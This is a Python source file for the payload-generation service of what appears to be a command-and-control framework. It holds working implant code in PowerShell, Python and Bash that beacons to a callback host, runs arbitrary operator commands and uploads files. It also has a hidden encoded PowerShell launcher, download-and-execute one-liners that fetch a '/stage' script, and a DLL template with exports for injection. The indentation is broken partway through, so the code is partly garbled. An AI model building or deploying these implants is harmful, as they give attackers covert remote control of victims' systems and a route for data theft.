## File 21: `c2-framework/server/services/payload_generator.py`
```python
"""
Payload generation service for creating agent binaries
"""

import os
import subprocess
import tempfile
import shutil
import hashlib
import json
import base64
from typing import Dict, Any, Optional, List
from datetime import datetime
from pathlib import Path

from core.database import SessionLocal
from core.models import Payload, Listener
from core.config import settings
from core.security import generate_encryption_key

class PayloadGenerator:
    """Generate agent payloads for different platforms"""
    
    def __init__(self):
        self.templates_dir = Path(__file__).parent.parent.parent / "agent"
        self.output_dir = Path(settings.PAYLOAD_DIR)
        self.output_dir.mkdir(exist_ok=True)
        
        # Supported payload types
        self.payload_types = {
            "exe": self.generate_exe,
            "dll": self.generate_dll,
            "shellcode": self.generate_shellcode,
            "powershell": self.generate_powershell,
            "python": self.generate_python,
            "bash": self.generate_bash
        }
        
        # Platform specific settings
        self.platform_configs = {
            "windows": {
                "x64": {"arch": "amd64", "compiler": "x86_64-w64-mingw32-gcc"},
                "x86": {"arch": "386", "compiler": "i686-w64-mingw32-gcc"}
            },
            "linux": {
                "x64": {"arch": "amd64", "compiler": "gcc"},
                "x86": {"arch": "386", "compiler": "gcc -m32"}
            },
            "darwin": {
                "x64": {"arch": "amd64", "compiler": "clang"},
                "arm64": {"arch": "arm64", "compiler": "clang -arch arm64"}
            }
        }
    
    async def generate_payload(
        self, 
        name: str,
        payload_type: str,
        platform: str,
        architecture: str,
        listener_id: str,
        configuration: Dict[str, Any],
        user_id: str
    ) -> Optional[str]:
        """Generate a payload"""
        
        # Validate inputs
        if payload_type not in self.payload_types:
            raise ValueError(f"Unsupported payload type: {payload_type}")
        
        if platform not in self.platform_configs:
            raise ValueError(f"Unsupported platform: {platform}")
        
        if architecture not in self.platform_configs[platform]:
            raise ValueError(f"Unsupported architecture: {architecture} for {platform}")
        
        # Get listener configuration
        db = SessionLocal()
        try:
            listener = db.query(Listener).filter(Listener.id == listener_id).first()
            if not listener:
                raise ValueError(f"Listener not found: {listener_id}")
            
            # Generate encryption key
            encryption_key = generate_encryption_key()
            
            # Prepare payload configuration
            payload_config = {
                "listener_type": listener.type,
                "callback_host": configuration.get("callback_host", "localhost"),
                "callback_port": listener.bind_port,
                "encryption_key": encryption_key,
                "sleep_interval": configuration.get("sleep_interval", 60),
                "jitter": configuration.get("jitter", 10),
                "kill_date": configuration.get("kill_date"),
                "working_hours": configuration.get("working_hours"),
                **configuration
            }
            
            # Generate payload
            generator_func = self.payload_types[payload_type]
            output_path = await generator_func(
                name, platform, architecture, payload_config
            )
            
            if not output_path:
                raise Exception("Payload generation failed")
            
            # Calculate hash
            file_hash = self.calculate_file_hash(output_path)
            file_size = os.path.getsize(output_path)
            
            # Save to database
            payload = Payload(
                name=name,
                type=payload_type,
                platform=platform,
                architecture=architecture,
                listener_id=listener_id,
                configuration=json.dumps(payload_config),
                output_path=output_path,
                file_hash=file_hash,
                file_size=file_size,
                created_by=user_id
            )
            
            db.add(payload)
            db.commit()
            db.refresh(payload)
            
            return payload.id
            
        finally:
            db.close()
    
    async def generate_exe(
        self, 
        name: str, 
        platform: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Generate executable payload"""
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # Copy agent source
            agent_dir = os.path.join(temp_dir, "agent")
            shutil.copytree(self.templates_dir, agent_dir)
            
            # Generate configuration file
            config_file = os.path.join(agent_dir, "config.json")
            with open(config_file, 'w') as f:
                json.dump(config, f)
            
            # Build based on platform
            if platform == "windows":
                output_path = await self.build_windows_exe(
                    name, agent_dir, architecture, config
                )
            elif platform == "linux":
                output_path = await self.build_linux_exe(
                    name, agent_dir, architecture, config
                )
            elif platform == "darwin":
                output_path = await self.build_darwin_exe(
                    name, agent_dir, architecture, config
                )
            else:
                raise ValueError(f"Unsupported platform: {platform}")
            
            # Move to output directory
            final_path = os.path.join(self.output_dir, f"{name}_{platform}_{architecture}.exe")
            shutil.move(output_path, final_path)
            
            return final_path
    
    async def build_windows_exe(
        self, 
        name: str, 
        source_dir: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Build Windows executable"""
        
        # Use PyInstaller for Python agents
        if os.path.exists(os.path.join(source_dir, "main.py")):
            return await self.build_python_exe(name, source_dir, "windows", architecture, config)
        
        # Use Go for Go agents
        if os.path.exists(os.path.join(source_dir, "main.go")):
            return await self.build_go_exe(name, source_dir, "windows", architecture, config)
        
        # Use MinGW for C agents
        if os.path.exists(os.path.join(source_dir, "main.c")):
            return await self.build_c_exe(name, source_dir, "windows", architecture, config)
        
        raise ValueError("No supported source files found")
    
    async def build_python_exe(
        self, 
        name: str, 
        source_dir: str, 
        platform: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Build Python executable using PyInstaller"""
        
        # Create spec file
        spec_content = f"""
# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['main.py'],
    pathex=['{source_dir}'],
    binaries=[],
    datas=[('config.json', '.')],
    hiddenimports=['requests', 'cryptography'],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='{name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='NONE'
)
"""
        
        spec_file = os.path.join(source_dir, f"{name}.spec")
        with open(spec_file, 'w') as f:
            f.write(spec_content)
        
        # Run PyInstaller
        cmd = [
            "pyinstaller",
            "--distpath", source_dir,
            "--workpath", os.path.join(source_dir, "build"),
            "--clean",
            spec_file
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"PyInstaller failed: {result.stderr}")
        
        # Get output path
        if platform == "windows":
            return os.path.join(source_dir, f"{name}.exe")
        else:
            return os.path.join(source_dir, name)
    
    async def build_go_exe(
        self, 
        name: str, 
        source_dir: str, 
        platform: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Build Go executable"""
        
        # Set environment variables
        env = os.environ.copy()
        env["GOOS"] = platform
        env["GOARCH"] = self.platform_configs[platform][architecture]["arch"]
        env["CGO_ENABLED"] = "0"
        
        # Build command
        output_name = f"{name}.exe" if platform == "windows" else name
        output_path = os.path.join(source_dir, output_name)
        
        cmd = [
            "go", "build",
            "-ldflags", "-s -w",  # Strip debug info
            "-o", output_path,
            "."
        ]
        
        # Add build tags
        if config.get("hide_console") and platform == "windows":
            cmd.extend(["-ldflags", "-H windowsgui"])
        
        result = subprocess.run(cmd, cwd=source_dir, env=env, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Go build failed: {result.stderr}")
        
        # Optionally UPX pack
        if config.get("upx_pack", True) and shutil.which("upx"):
            subprocess.run(["upx", "-9", output_path], capture_output=True)
        
        return output_path
    
    async def build_c_exe(
        self, 
        name: str, 
        source_dir: str, 
        platform: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Build C executable"""
        
        compiler = self.platform_configs[platform][architecture]["compiler"]
        
        # Collect source files
        source_files = []
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                if file.endswith('.c'):
                    source_files.append(os.path.join(root, file))
        
        # Build command
        output_name = f"{name}.exe" if platform == "windows" else name
        output_path = os.path.join(source_dir, output_name)
        
        cmd = compiler.split() + [
            "-O2",  # Optimize
            "-s",   # Strip symbols
            "-o", output_path
        ] + source_files
        
        # Platform specific flags
        if platform == "windows":
            cmd.extend(["-lws2_32", "-lwininet"])  # Windows libraries
            if config.get("hide_console"):
                cmd.append("-mwindows")
        
        result = subprocess.run(cmd, cwd=source_dir, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"C compilation failed: {result.stderr}")
        
        return output_path
    
    async def build_linux_exe(
        self, 
        name: str, 
        source_dir: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Build Linux executable"""
        
        # Similar to Windows but with Linux-specific options
        if os.path.exists(os.path.join(source_dir, "main.py")):
            return await self.build_python_exe(name, source_dir, "linux", architecture, config)
        elif os.path.exists(os.path.join(source_dir, "main.go")):
            return await self.build_go_exe(name, source_dir, "linux", architecture, config)
        elif os.path.exists(os.path.join(source_dir, "main.c")):
            return await self.build_c_exe(name, source_dir, "linux", architecture, config)
        
        raise ValueError("No supported source files found")
    
    async def build_darwin_exe(
        self, 
        name: str, 
        source_dir: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Build macOS executable"""
        
        # Similar to Linux but with macOS-specific options
        if os.path.exists(os.path.join(source_dir, "main.py")):
            return await self.build_python_exe(name, source_dir, "darwin", architecture, config)
        elif os.path.exists(os.path.join(source_dir, "main.go")):
            return await self.build_go_exe(name, source_dir, "darwin", architecture, config)
        elif os.path.exists(os.path.join(source_dir, "main.c")):
            return await self.build_c_exe(name, source_dir, "darwin", architecture, config)
        
        raise ValueError("No supported source files found")
    
    async def generate_dll(
        self, 
        name: str, 
        platform: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Generate DLL payload"""
        
        if platform != "windows":
            raise ValueError("DLL payloads are only supported on Windows")
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create DLL source
            dll_source = self.create_dll_source(config)
            source_file = os.path.join(temp_dir, "payload.c")
            
            with open(source_file, 'w') as f:
                f.write(dll_source)
            
            # Compile DLL
            compiler = self.platform_configs[platform][architecture]["compiler"]
            output_path = os.path.join(temp_dir, f"{name}.dll")
            
            cmd = compiler.split() + [
                "-shared",
                "-o", output_path,
                source_file,
                "-lws2_32", "-lwininet"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                raise Exception(f"DLL compilation failed: {result.stderr}")
            
            # Move to output directory
            final_path = os.path.join(self.output_dir, f"{name}_{architecture}.dll")
            shutil.move(output_path, final_path)
            
            return final_path
    
    def create_dll_source(self, config: Dict[str, Any]) -> str:
        """Create DLL source code"""
        
        callback_host = config.get("callback_host", "localhost")
        callback_port = config.get("callback_port", 443)
        
        return f"""
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

#define CALLBACK_HOST "{callback_host}"
#define CALLBACK_PORT {callback_port}

DWORD WINAPI AgentThread(LPVOID lpParam) {{
    // Agent implementation
    while (1) {{
        // Check in with C2
        HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet) {{
            // Make HTTP request
            // ... implementation ...
            InternetCloseHandle(hInternet);
        }}
        
        Sleep(60000); // Sleep 60 seconds
    }}
    return 0;
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {{
    switch (dwReason) {{
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, AgentThread, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }}
    return TRUE;
}}

// Export functions for various DLL injection methods
extern "C" __declspec(dllexport) void RunDLL() {{
    AgentThread(NULL);
}}

extern "C" __declspec(dllexport) void DllRegisterServer() {{
    AgentThread(NULL);
}}
"""
    
    async def generate_shellcode(
        self, 
        name: str, 
        platform: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Generate shellcode payload"""
        
        # Generate minimal shellcode
        if platform == "windows":
            shellcode = await self.generate_windows_shellcode(architecture, config)
        elif platform == "linux":
            shellcode = await self.generate_linux_shellcode(architecture, config)
        else:
            raise ValueError(f"Shellcode not supported for platform: {platform}")
        
        # Save shellcode
        output_path = os.path.join(self.output_dir, f"{name}_{platform}_{architecture}.bin")
        with open(output_path, 'wb') as f:
            f.write(shellcode)
        
        # Also save as C array
        c_array = self.shellcode_to_c_array(shellcode)
        c_path = os.path.join(self.output_dir, f"{name}_{platform}_{architecture}.h")
        with open(c_path, 'w') as f:
            f.write(c_array)
        
        return output_path
    
    async def generate_windows_shellcode(self, architecture: str, config: Dict[str, Any]) -> bytes:
        """Generate Windows shellcode"""
        
        # This is a placeholder - real implementation would use
        # tools like msfvenom or custom assembly
        
        if architecture == "x64":
            # x64 shellcode stub
            shellcode = b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff"
        else:
            # x86 shellcode stub
            shellcode = b"\x31\xc9\x51\x68\x2f\x2f\x73\x68"
        
        return shellcode
    
    async def generate_linux_shellcode(self, architecture: str, config: Dict[str, Any]) -> bytes:
        """Generate Linux shellcode"""
        
        # Placeholder implementation
        if architecture == "x64":
            # x64 shellcode stub
            shellcode = b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6"
        else:
            # x86 shellcode stub
            shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
        
        return shellcode
    
    def shellcode_to_c_array(self, shellcode: bytes) -> str:
        """Convert shellcode to C array"""
        
        hex_bytes = [f"0x{b:02x}" for b in shellcode]
        
        c_code = f"""// Shellcode - {len(shellcode)} bytes
unsigned char shellcode[] = {{
"""
        
        # Format in rows of 12 bytes
        for i in range(0, len(hex_bytes), 12):
            row = hex_bytes[i:i+12]
            c_code += "    " + ", ".join(row) + ",\n"
        
        c_code = c_code.rstrip(",\n") + "\n};\n"
        c_code += f"unsigned int shellcode_len = {len(shellcode)};\n"
        
        return c_code
    
    async def generate_powershell(
        self, 
        name: str, 
        platform: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Generate PowerShell payload"""
        
        if platform != "windows":
            raise ValueError("PowerShell payloads are only supported on Windows")
        
        # Generate PowerShell script
        ps_script = self.create_powershell_script(config)
        
        # Encode script
        encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
        
        # Create launcher
        launcher = f"powershell.exe -nop -w hidden -enc {encoded}"
        
        # Save files
        script_path = os.path.join(self.output_dir, f"{name}.ps1")
        with open(script_path, 'w') as f:
            f.write(ps_script)
        
        launcher_path = os.path.join(self.output_dir, f"{name}_launcher.txt")
        with open(launcher_path, 'w') as f:
            f.write(launcher)
        
        return script_path
    
    def create_powershell_script(self, config: Dict[str, Any]) -> str:
        """Create PowerShell agent script"""
        
        callback_host = config.get("callback_host", "localhost")
        callback_port = config.get("callback_port", 443)
        encryption_key = config.get("encryption_key", "")
        
        return f"""
$ErrorActionPreference = 'SilentlyContinue'

# Configuration
$CallbackHost = '{callback_host}'
$CallbackPort = {callback_port}
$EncryptionKey = '{encryption_key}'
$SleepTime = {config.get('sleep_interval', 60)}

# Agent ID
$AgentID = [System.Guid]::NewGuid().ToString()

# System information
$Hostname = $env:COMPUTERNAME
$Username = $env:USERNAME
$Platform = 'Windows'
$Architecture = if ([Environment]::Is64BitOperatingSystem) {{ 'x64' }} else {{ 'x86' }}
$ProcessID = $PID

# Get IP addresses
$InternalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.InterfaceAlias -notmatch 'Loopback' }}).IPAddress | Select-Object -First 1

# Main loop
while ($true) {{
    try {{
        # Prepare check-in data
        $CheckinData = @{{
            agent_id = $AgentID
            hostname = $Hostname
            username = $Username
            platform = $Platform
            architecture = $Architecture
            process_id = $ProcessID
            internal_ip = $InternalIP
            external_ip = $InternalIP
            session_id = '{config.get("session_id", "")}'
        }} | ConvertTo-Json
        
        # Make HTTP request
        $URL = "http://$CallbackHost`:$CallbackPort/api/v1/checkin"
        $Response = Invoke-RestMethod -Uri $URL -Method Post -Body $CheckinData -ContentType 'application/json'
        
        # Process tasks
        foreach ($Task in $Response.tasks) {{
            try {{
                $Result = Invoke-Expression $Task.parameters.command 2>&1 | Out-String
                
                # Send result
                $ResultData = @{{
                    task_id = $Task.id
                    result = $Result
                    status = 'completed'
                }} | ConvertTo-Json
                
                Invoke-RestMethod -Uri "http://$CallbackHost`:$CallbackPort/api/v1/result" -Method Post -Body $ResultData -ContentType 'application/json'
            }}
            catch {{
                # Send error
                $ErrorData = @{{
                    task_id = $Task.id
                    error = $_.Exception.Message
                    status = 'failed'
                }} | ConvertTo-Json
                
                Invoke-RestMethod -Uri "http://$CallbackHost`:$CallbackPort/api/v1/result" -Method Post -Body $ErrorData -ContentType 'application/json'
            }}
        }}
    }}
    catch {{
        # Ignore errors
    }}
    
    # Sleep with jitter
    $Jitter = Get-Random -Minimum 0 -Maximum 10
    Start-Sleep -Seconds ($SleepTime + $Jitter)
}}
"""
    
    async def generate_python(
        self, 
        name: str, 
        platform: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Generate Python payload"""
        
        # Create Python agent script
        py_script = self.create_python_script(config)
        
        # Save script
        script_path = os.path.join(self.output_dir, f"{name}.py")
        with open(script_path, 'w') as f:
            f.write(py_script)
        
        # Create oneliner
        oneliner = self.create_python_oneliner(config)
        oneliner_path = os.path.join(self.output_dir, f"{name}_oneliner.txt")
        with open(oneliner_path, 'w') as f:
            f.write(oneliner)
        
        return script_path
    
    def create_python_script(self, config: Dict[str, Any]) -> str:
        """Create Python agent script"""
        
        return f"""#!/usr/bin/env python3
import os
import sys
import time
import json
import socket
import platform
import subprocess
import requests
from urllib.parse import urljoin

# Configuration
CALLBACK_HOST = '{config.get("callback_host", "localhost")}'
CALLBACK_PORT = {config.get("callback_port", 443)}
ENCRYPTION_KEY = '{config.get("encryption_key", "")}'
SESSION_ID = '{config.get("session_id", "")}'
SLEEP_TIME = {config.get("sleep_interval", 60)}
JITTER = {config.get("jitter", 10)}

# Disable SSL warnings
import urllib3
urllib3.disable_warnings()

class Agent:
    def __init__(self):
        self.agent_id = None
        self.base_url = f"http://{{CALLBACK_HOST}}:{{CALLBACK_PORT}}"
        self.session = requests.Session()
        self.session.verify = False
        self.system_info = self.get_system_info()
    
    def get_system_info(self):
        return {{
            'hostname': socket.gethostname(),
            'username': os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
            'platform': platform.system(),
            'architecture': platform.machine(),
            'process_id': os.getpid(),
            'internal_ip': self.get_internal_ip(),
            'external_ip': self.get_internal_ip(),  # Simplified
            'session_id': SESSION_ID
        }}
    
    def get_internal_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def checkin(self):
        try:
            data = self.system_info.copy()
            if self.agent_id:
                data['agent_id'] = self.agent_id
            
            response = self.session.post(
                urljoin(self.base_url, '/api/v1/checkin'),
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if not self.agent_id:
                    self.agent_id = result.get('agent_id')
                return result.get('tasks', [])
        except:
            pass
        return []
    
    def execute_task(self, task):
        task_id = task['id']
        command = task['command']
        parameters = task.get('parameters', {{}})
        
        try:
            if command == 'shell':
                result = subprocess.check_output(
                    parameters.get('command', ''),
                    shell=True,
                    stderr=subprocess.STDOUT,
                    text=True
                )
                self.send_result(task_id, result, 'completed')
            else:
                self.send_result(task_id, None, 'failed', f'Unknown command: {{command}}')
        except Exception as e:
            self.send_result(task_id, None, 'failed', str(e))
    
    def send_result(self, task_id, result=None, status='completed', error=None):
        try:
            data = {{
                'task_id': task_id,
                'status': status,
                'result': result,
                'error': error
            }}
            
            self.session.post(
                urljoin(self.base_url, '/api/v1/result'),
                json=data,
                timeout=10
            )
        except:
            pass
    
    def run(self):
        while True:
            try:
                tasks = self.checkin()
                for task in tasks:
                    self.execute_task(task)
            except:
                pass
            
            # Sleep with jitter
            import random
            jitter = random.randint(0, JITTER)
            time.sleep(SLEEP_TIME + jitter)

if __name__ == '__main__':
    agent = Agent()
    agent.run()
"""
    
    def create_python_oneliner(self, config: Dict[str, Any]) -> str:
        """Create Python one-liner"""
        
        host = config.get("callback_host", "localhost")
        port = config.get("callback_port", 443)
        
        # Create a compressed one-liner
        code = f"""
import urllib.request;
exec(urllib.request.urlopen('http://{host}:{port}/stage').read())
"""
        
        # Encode and create one-liner
        encoded = base64.b64encode(code.strip().encode()).decode()
        return f"python3 -c \"import base64;exec(base64.b64decode('{encoded}'))\""
    
    async def generate_bash(
        self, 
        name: str, 
        platform: str, 
        architecture: str, 
        config: Dict[str, Any]
    ) -> str:
        """Generate Bash payload"""
        
        if platform not in ["linux", "darwin"]:
            raise ValueError("Bash payloads are only supported on Linux and macOS")
        
        # Create Bash script
        bash_script = self.create_bash_script(config)
        
        # Save script
       script_path = os.path.join(self.output_dir, f"{name}.sh")
       with open(script_path, 'w') as f:
           f.write(bash_script)
       
       # Make executable
       os.chmod(script_path, 0o755)
       
       # Create one-liner
       oneliner = self.create_bash_oneliner(config)
       oneliner_path = os.path.join(self.output_dir, f"{name}_oneliner.txt")
       with open(oneliner_path, 'w') as f:
           f.write(oneliner)
       
       return script_path
   
   def create_bash_script(self, config: Dict[str, Any]) -> str:
       """Create Bash agent script"""
       
       callback_host = config.get("callback_host", "localhost")
       callback_port = config.get("callback_port", 443)
       session_id = config.get("session_id", "")
       
       return f"""#!/bin/bash

# Configuration
CALLBACK_HOST="{callback_host}"
CALLBACK_PORT={callback_port}
SESSION_ID="{session_id}"
SLEEP_TIME={config.get("sleep_interval", 60)}
AGENT_ID=""

# Get system information
HOSTNAME=$(hostname)
USERNAME=$(whoami)
PLATFORM=$(uname -s)
ARCHITECTURE=$(uname -m)
PROCESS_ID=$$
INTERNAL_IP=$(ip route get 1 | awk '{{print $7;exit}}' 2>/dev/null || ifconfig | grep -Eo 'inet (addr:)?([0-9]*\\.)+[0-9]*' | grep -v '127.0.0.1' | awk '{{print $2}}' | head -1)

# Check-in function
checkin() {{
   local data
   if [ -z "$AGENT_ID" ]; then
       data='{{
           "hostname": "'$HOSTNAME'",
           "username": "'$USERNAME'",
           "platform": "'$PLATFORM'",
           "architecture": "'$ARCHITECTURE'",
           "process_id": '$PROCESS_ID',
           "internal_ip": "'$INTERNAL_IP'",
           "external_ip": "'$INTERNAL_IP'",
           "session_id": "'$SESSION_ID'"
       }}'
   else
       data='{{
           "agent_id": "'$AGENT_ID'",
           "hostname": "'$HOSTNAME'",
           "username": "'$USERNAME'",
           "platform": "'$PLATFORM'",
           "architecture": "'$ARCHITECTURE'",
           "process_id": '$PROCESS_ID',
           "internal_ip": "'$INTERNAL_IP'",
           "external_ip": "'$INTERNAL_IP'",
           "session_id": "'$SESSION_ID'"
       }}'
   fi
   
   response=$(curl -s -X POST \\
       -H "Content-Type: application/json" \\
       -d "$data" \\
       "http://$CALLBACK_HOST:$CALLBACK_PORT/api/v1/checkin")
   
   # Extract agent_id if first check-in
   if [ -z "$AGENT_ID" ]; then
       AGENT_ID=$(echo "$response" | grep -o '"agent_id":"[^"]*' | cut -d'"' -f4)
   fi
   
   # Extract tasks
   echo "$response" | grep -o '"tasks":\\[[^]]*\\]' | sed 's/"tasks"://'
}}

# Execute command
execute_command() {{
   local task_id=$1
   local command=$2
   local parameters=$3
   
   local result
   local status="completed"
   
   case "$command" in
       "shell")
           cmd=$(echo "$parameters" | grep -o '"command":"[^"]*' | cut -d'"' -f4)
           result=$(eval "$cmd" 2>&1)
           ;;
       "download")
           path=$(echo "$parameters" | grep -o '"path":"[^"]*' | cut -d'"' -f4)
           if [ -f "$path" ]; then
               result=$(base64 "$path" 2>/dev/null || base64 -i "$path")
           else
               result="File not found"
               status="failed"
           fi
           ;;
       *)
           result="Unknown command: $command"
           status="failed"
           ;;
   esac
   
   # Send result
   local result_data='{{
       "task_id": "'$task_id'",
       "result": "'$(echo "$result" | sed 's/"/\\"/g' | tr '\\n' ' ')'",
       "status": "'$status'"
   }}'
   
   curl -s -X POST \\
       -H "Content-Type: application/json" \\
       -d "$result_data" \\
       "http://$CALLBACK_HOST:$CALLBACK_PORT/api/v1/result" >/dev/null 2>&1
}}

# Main loop
while true; do
   # Check in and get tasks
   tasks=$(checkin)
   
   # Process tasks
   if [ -n "$tasks" ] && [ "$tasks" != "[]" ]; then
       # Parse and execute each task
       echo "$tasks" | grep -o '{{[^}}]*}}' | while read -r task; do
           task_id=$(echo "$task" | grep -o '"id":"[^"]*' | cut -d'"' -f4)
           command=$(echo "$task" | grep -o '"command":"[^"]*' | cut -d'"' -f4)
           parameters=$(echo "$task" | grep -o '"parameters":{{[^}}]*}}' | cut -d':' -f2-)
           
           if [ -n "$task_id" ] && [ -n "$command" ]; then
               execute_command "$task_id" "$command" "$parameters"
           fi
       done
   fi
   
   # Sleep with jitter
   jitter=$((RANDOM % 10))
   sleep $((SLEEP_TIME + jitter))
done
"""
   
   def create_bash_oneliner(self, config: Dict[str, Any]) -> str:
       """Create Bash one-liner"""
       
       host = config.get("callback_host", "localhost")
       port = config.get("callback_port", 443)
       
       # Create download and execute one-liner
       return f"curl -s http://{host}:{port}/stage | bash"
   
   def calculate_file_hash(self, file_path: str) -> str:
       """Calculate SHA256 hash of file"""
       sha256_hash = hashlib.sha256()
       
       with open(file_path, "rb") as f:
           for byte_block in iter(lambda: f.read(4096), b""):
               sha256_hash.update(byte_block)
       
       return sha256_hash.hexdigest()
   
   async def get_payload(self, payload_id: str) -> Optional[Dict[str, Any]]:
       """Get payload information"""
       db = SessionLocal()
       try:
           payload = db.query(Payload).filter(Payload.id == payload_id).first()
           if payload:
               return {
                   "id": payload.id,
                   "name": payload.name,
                   "type": payload.type,
                   "platform": payload.platform,
                   "architecture": payload.architecture,
                   "file_hash": payload.file_hash,
                   "file_size": payload.file_size,
                   "created_at": payload.created_at,
                   "output_path": payload.output_path
               }
       finally:
           db.close()
       
       return None
   
   async def list_payloads(self, filters: Dict[str, Any] = None) -> List[Dict[str, Any]]:
       """List all payloads with optional filters"""
       db = SessionLocal()
       try:
           query = db.query(Payload)
           
           if filters:
               if filters.get("type"):
                   query = query.filter(Payload.type == filters["type"])
               if filters.get("platform"):
                   query = query.filter(Payload.platform == filters["platform"])
               if filters.get("architecture"):
                   query = query.filter(Payload.architecture == filters["architecture"])
           
           payloads = query.order_by(Payload.created_at.desc()).all()
           
           return [{
               "id": p.id,
               "name": p.name,
               "type": p.type,
               "platform": p.platform,
               "architecture": p.architecture,
               "file_hash": p.file_hash,
               "file_size": p.file_size,
               "created_at": p.created_at
           } for p in payloads]
           
       finally:
           db.close()
   
   async def delete_payload(self, payload_id: str) -> bool:
       """Delete a payload"""
       db = SessionLocal()
       try:
           payload = db.query(Payload).filter(Payload.id == payload_id).first()
           if payload:
               # Delete file
               if os.path.exists(payload.output_path):
                   os.remove(payload.output_path)
               
               # Delete from database
               db.delete(payload)
               db.commit()
               return True
               
       finally:
           db.close()
       
       return False

# Global payload generator instance
payload_generator = PayloadGenerator()
